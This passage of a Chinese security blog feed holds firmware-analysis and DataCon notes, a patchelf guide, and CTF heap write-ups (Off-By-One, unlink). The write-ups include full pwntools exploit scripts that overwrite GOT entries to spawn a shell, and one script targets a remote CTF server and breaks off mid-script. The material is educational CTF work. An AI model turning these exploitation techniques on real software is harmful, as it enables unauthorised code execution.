href="https://github.com/liyansong2018/firmware-analysis-plus">https://github.com/liyansong2018/firmware-analysis-plus</a>）比较友好（和fat基本一样，只不过细节上做了一些修改），首先，其他项目的文件统一放在了库里（没有那个递归了😅）然后还做了一个docker，但是这个docker没有装jefferson，仿真不了jffs的文件系统，只能继续自己配环境😅。fat.py后面要加一个-q qemu-path的参数，否则network  interface列表会为空（nc如我还跑去人家issue底下问，还好人家没过几分钟就回复了😅）</p><p>然后exp部分一开始我用的这个帖子的exp ：<a href="http://www.manongzj.com/blog/28-tkbcqqitdf.html">http://www.manongzj.com/blog/28-tkbcqqitdf.html</a>，跑不通，后来换成了前文用的exp，居然好使了。。。我没看出来这俩exp有啥区别，不想管了😅，第一次固件仿真到此结束，漏洞是啥原理暂时不想管了</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>菜鸡的2022datacon记录</title>
    <link href="/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/"/>
    <url>/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/</url>
    
    <content type="html"><![CDATA[<h4 id="固件基地址识别"><a href="#固件基地址识别" class="headerlink" title="固件基地址识别"></a>固件基地址识别</h4><p>rbasefind - <a href="https://github.com/sgayou/rbasefind">https://github.com/sgayou/rbasefind</a></p><p>此项目用rust写的，用<code>cargo build</code>之后会生成可执行文件在<code>target</code>路径下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rbasefind &lt;<span class="hljs-type">path</span>-<span class="hljs-keyword">to</span>-bin&gt; <br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure><p>通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）</p><p>实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码….）</p><p><img src="/img/datacon/1.jpg"></p><p>应该是50个固件识别成功了38个</p><h5 id="对rbasefind源码的分析"><a href="#对rbasefind源码的分析" class="headerlink" title="对rbasefind源码的分析"></a>对rbasefind源码的分析</h5><p>按程序执行顺序分析</p><ol><li><p><code>get_strings()</code></p><p>利用一个正则表达式匹配</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[ -~<span class="hljs-symbol">\t</span>\r<span class="hljs-symbol">\n</span>]&#123;10,&#125;  // 从空格(48)到制表符(126) 以及 \r<span class="hljs-symbol">\n</span> 的所有有效字符 <br></code></pre></td></tr></table></figure><p>长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）</p></li><li><p><code>get_pointers()</code></p><p>提取整个文件的u32（？），会根据参数<code>big_endian</code>判断文件的大小端</p></li><li><p><code>find_match() -&gt; Interval::get_range()</code></p><p>把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）</p></li><li><p>每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）</p></li><li><p>下面的代码中current_addr遍历了<code> [interval.start_addr : interval.end_addr : offset]</code></p><p>将每个str的首地址加上current_addr，把这些地址和pointers集合取交集</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">news</span> = FnvHashSet::<span class="hljs-title function_ invoke__">default</span>();<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">s</span> <span class="hljs-keyword">in</span> strings &#123;<br>        <span class="hljs-keyword">match</span> s.<span class="hljs-title function_ invoke__">checked_add</span>(current_addr) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(add) =&gt; news.<span class="hljs-title function_ invoke__">insert</span>(add),<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class="hljs-title function_ invoke__">intersection</span>(pointers).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-keyword">if</span> !intersection.<span class="hljs-title function_ invoke__">is_empty</span>() &#123;<br>        heap.<span class="hljs-title function_ invoke__">push</span>((intersection.<span class="hljs-title function_ invoke__">len</span>(), current_addr));<br>    &#125;<br>    <span class="hljs-keyword">match</span> current_addr.<span class="hljs-title function_ invoke__">checked_add</span>(config.offset) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>取出交集size最大的top n个current_addr进行输出</p><p>见本节最开头的示例，输出格式为 addr :  interaction_size</p><p>size最大的即认为是最有可能的基地址</p><p><strong>目前尚不清楚这样做的道理是什么</strong></p><p>猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址</p><p>（纯瞎猜💔）</p></li></ol><h4 id="函数符号恢复"><a href="#函数符号恢复" class="headerlink" title="函数符号恢复"></a>函数符号恢复</h4><h5 id="几个已知的方法"><a href="#几个已知的方法" class="headerlink" title="几个已知的方法"></a>几个已知的方法</h5><p>我认为这篇文章写的很不错 <a href="https://blog.csdn.net/abel_big_xu/article/details/124388798">https://blog.csdn.net/abel_big_xu/article/details/124388798</a></p><ol><li><p>FLIRT</p><p>ida自带的一个插件，FLIRT可以对某个静态函数库生成签名，然后和待分析的程序匹配</p><p>缺点在于需要已知库函数文件</p></li><li><p>lscan   </p><p><a href="https://github.com/maroueneboubakri/lscan">https://github.com/maroueneboubakri/lscan</a>（我和前面挂着的那篇csdn文章作者一样，没搞懂这个工具）</p><p>lscan算是对flirt进行了一个包装，只要把一堆静态库放在一个文件夹里，他会遍历这个文件夹对每个静态库生成签名，然后再用FLIRT进行比对</p><p>lscan项目里自带的一些静态库是可以成功运行的，但是我试了一下写的静态库，例如sigdatabase <a href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a> 运行会报错</p><p>然后还有一个很奇怪的点在于匹配时对于某个库的相似度会超过百分之100%（在lscan的issue里也有人提到），但实际用ida的flirt打开时这个库并不能很好地匹配分析文件</p></li><li><p>Rizzo</p><p>没实际测试过，略</p></li><li><p>finger</p><p>finger是阿里云开发的ida插件  -  <a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a></p><p>用起来很简单</p></li><li><p>lumina </p><p>没有测试过，ida的一个官方符号识别插件，需要远程连接到ida lumina的服务器</p><p>有一个山寨版的服务器lumen，可以替代lumina，但好像现在已经不好使了</p></li></ol><h5 id="在datacon符号恢复数据集上的实测"><a href="#在datacon符号恢复数据集上的实测" class="headerlink" title="在datacon符号恢复数据集上的实测"></a>在datacon符号恢复数据集上的实测</h5><p>给了20个程序，只有一个x86的程序，用finger基本能识别出来，有几个arm、mips的程序，还有其他很多奇奇怪怪的平台ida都反汇编不了，跟不用说符号恢复了，寄</p><h4 id="powershell反混淆"><a href="#powershell反混淆" class="headerlink" title="powershell反混淆"></a>powershell反混淆</h4><p>PowerDecode  -  <a href="https://github.com/Malandrone/PowerDecode">https://github.com/Malandrone/PowerDecode</a></p><p>对于单个文件反混淆很好用，而且实测比下边那个工具效果要好</p><p>但是问题在于，它提供的“分析整个文件夹下所有文件”功能，输出结果全是 1.txt 2.txt 3.txt …..</p><p>然后这些txt里也看不出来对应着哪个pwsh脚本，一开始想着是不是文件名称排列的顺序，但好像不对，代码全是powershell写的，也没搞懂该咋办</p><p>因此只能换了第二个工具</p><p>PSDecode - <a href="https://github.com/R3MRUM/PSDecode">https://github.com/R3MRUM/PSDecode</a> </p><p>会在TEMP路径下留下解析过程中各个layer的数据</p><p><img src="/img/datacon/2.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exp</tag>
      
      <tag>datacon</tag>
      
      <tag>iot-sec</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Off-By-One</title>
    <link href="/2022/11/27/ctf-pwn/Off-By-One/"/>
    <url>/2022/11/27/ctf-pwn/Off-By-One/</url>
    
    <content type="html"><![CDATA[<h4 id="Off-By-One漏洞如何产生"><a href="#Off-By-One漏洞如何产生" class="headerlink" title="Off-By-One漏洞如何产生"></a>Off-By-One漏洞如何产生</h4><ol><li><p>循环多一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure><p>x的下一个chunk第一个字节被溢出了</p></li><li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">100</span>)<br>&#123;<br>    <span class="hljs-built_in">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>strlen</code>返回值不算结束符’<code>\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p></li></ol><h4 id="hitcon-creator"><a href="#hitcon-creator" class="headerlink" title="hitcon_creator"></a>hitcon_creator</h4><p>题目来源</p><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p><h5 id="1-create"><a href="#1-create" class="headerlink" title="1. create"></a>1. create</h5><p><img src="/img/off_by_one/1.png"></p><p>从上述结构可以推断出heaparray是如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class="hljs-type">char</span> * content;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span> * <span class="hljs-title">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure><h5 id="2-edit"><a href="#2-edit" class="headerlink" title="2. edit"></a>2. edit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p><p>可以覆盖下一个chunk的size字段</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol><li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p><p> <img src="/img/off_by_one/2.jpg"></p></li><li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p><p><img src="/img/off_by_one/3.jpg"></p></li><li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p><p> <img src="/img/off_by_one/4.jpg"></p><p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p><p> <img src="/img/off_by_one/5.jpg"></p></li><li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p><p> 同时，在2号的content位置写入<code>free@got</code></p><p> 这时调用show(2)会泄露free的地址</p><p> <img src="/img/off_by_one/6.jpg"></p></li><li><p>泄露libc基址找到system地址</p></li><li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p></li><li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p></li></ol><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><blockquote><p>libcsearcher挑版本为2.23的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(free_got))<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))<br><span class="hljs-comment">#gdb.attach(r)</span><br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patchelf修改libc版本</title>
    <link href="/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/"/>
    <url>/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure><h4 id="修改libc-so和ld-so"><a href="#修改libc-so和ld-so" class="headerlink" title="修改libc.so和ld.so"></a>修改libc.so和ld.so</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class="hljs-comment"># param1 : old libc.so</span><br><span class="hljs-comment"># param2 : new libc.so</span><br><span class="hljs-comment"># param3 : path to elf</span><br></code></pre></td></tr></table></figure><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><p><img src="/img/patchelf/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/11/25/ctf-pwn/unlink/"/>
    <url>/2022/11/25/ctf-pwn/unlink/</url>
    
    <content type="html"><![CDATA[<p>原理</p><blockquote><p>以下内容一律假设 sz = 4 bytes  ，32位系统</p></blockquote><h4 id="unlink时向任意地址写入数据原理"><a href="#unlink时向任意地址写入数据原理" class="headerlink" title="unlink时向任意地址写入数据原理"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p><p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p><p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class="hljs-number">8</span>)+<span class="hljs-number">12</span>) = *(P+<span class="hljs-number">12</span>)<br><span class="hljs-comment">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class="hljs-number">12</span>)+<span class="hljs-number">8</span>) = *(P+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p><p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p><p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p><blockquote><p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p></blockquote><p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p><h4 id="上面这些都没用"><a href="#上面这些都没用" class="headerlink" title="上面这些都没用"></a>上面这些都没用</h4><p><img src="/img/unlink/1.jpg"></p><h4 id="加入检查机制之后"><a href="#加入检查机制之后" class="headerlink" title="加入检查机制之后"></a>加入检查机制之后</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>因此溢出时需要额外保证以下条件</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">*(<span class="hljs-name">*</span>(<span class="hljs-name">P+8</span>) <span class="hljs-number">+12</span>) == P<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">P+12</span>)+ <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure><p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p><p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p><p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p><h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><p><strong>需要注意的是unlink的fakechunk大小不能小于max fastbin，因为fastbin里的根本没有把下一个inuse bit置零，也就不会存在unlink</strong></p><p>使用了one gadget，还有覆盖atoi的got表都成功了，但是覆盖free的got表，再delete(2)却不能成功，不知道原因</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./note2&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./note2&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25956</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;)&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, choice, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    